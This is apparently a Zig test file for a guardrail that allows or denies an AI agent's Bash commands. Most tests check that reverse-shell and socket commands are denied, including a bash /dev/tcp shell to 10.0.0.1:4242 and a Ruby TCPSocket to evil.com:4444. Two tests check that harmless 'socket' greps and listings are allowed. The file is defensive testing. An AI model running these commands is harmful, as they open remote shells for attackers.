const std = @import("std");
const evaluator = @import("../evaluator.zig");
const evaluate = evaluator.evaluate;

test "block bash reverse shell" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block perl socket reverse shell" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "perl -e 'use Socket;'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block python pty spawn" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block ruby socket" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ruby -rsocket -e 'TCPSocket'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block node child_process" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "node -e 'require(\"child_process\").exec(\"id\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block /dev/tcp access" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "cat /dev/tcp/10.0.0.1/80" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow grep socket" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "grep socket src/server.ts" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow ls socket file" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ls /tmp/mysocket.sock" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block python import socket" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python3 -c 'import socket; s=socket.socket()'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block ruby TCPSocket" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ruby -e 'TCPSocket.new(\"evil.com\", 4444)'" } });
    try std.testing.expectEqual(.deny, r.decision);
}
